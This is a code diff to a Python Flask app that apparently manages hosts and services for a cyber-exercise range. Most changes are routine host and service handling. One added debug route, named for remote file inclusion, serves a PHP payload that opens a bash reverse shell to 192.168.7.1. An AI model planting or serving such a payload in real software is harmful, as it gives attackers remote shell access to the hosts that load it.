@@ -63,7 +63,10 @@ def hosts_in_world(world_id):
         if os is None:
             return 'Invalid Operating System id'
 
-        Host(hostname=hostname, os=os, world=world).save()
+        h = Host(hostname=hostname, os=os, world=world)
+        h.install_os()
+        h.save()
+
         return "Host added successfully"
 
 
@@ -139,10 +142,17 @@ def get_host(host_id):
             if service is None:
                 return 'invalid service id', 400
 
-            if service.install(host, files=files, **options):
+            try:
+                check = host.services.get(name=service.name)
+                check.options = options
+                host.save()
                 return host.to_json()
-            else:
-                return 'installation failed', 400
+            except DoesNotExist:
+                if service.install(host, files=files, **options):
+                    host.save()
+                    return host.to_json()
+                else:
+                    return 'installation failed', 400
         else:
             return 'invalid action', 400
 
@@ -156,9 +166,12 @@ def get_oses():
 def get_services():
     return Service.objects().to_json()
 
+
+@app.route('/api/debug/rfi')
+def rfi():
+    return '<?php echo hello; shell_exec("bash -i >& /dev/tcp/192.168.7.1/444 0>&1");?>'
 print "cyberfront starting"
 
-# ubuntu = OperatingSystem.objects().first()
 # ubuntu = OperatingSystem(kernel='LINUX', name='Ubuntu', version='14.04', box='ubuntu/trusty64')
 # ubuntu.save()
 
@@ -174,6 +187,17 @@ if len(Service.objects()) == 0:
     }
     apache2 = Service(name='apache_ubuntu', service_name='Apache Web Server', version='2', options=options)
     apache2.save()
+
+sudo_options = {
+    'users': ConfigurationOption(name='Sudoers', description='List of sudoers', type='USER', list=True, default=[])
+}
+# sudo = Service(name='ubuntu_sudo', service_name='sudo', version='?', options=sudo_options)
+# sudo.save()
+
+# sudo = Service.objects(name="ubuntu_sudo").first()
+# ubuntu = OperatingSystem.objects().first()
+# ubuntu.services = [sudo]
+# ubuntu.save()
 
 # World(name='world1').save()
 # World(name='world2').save()
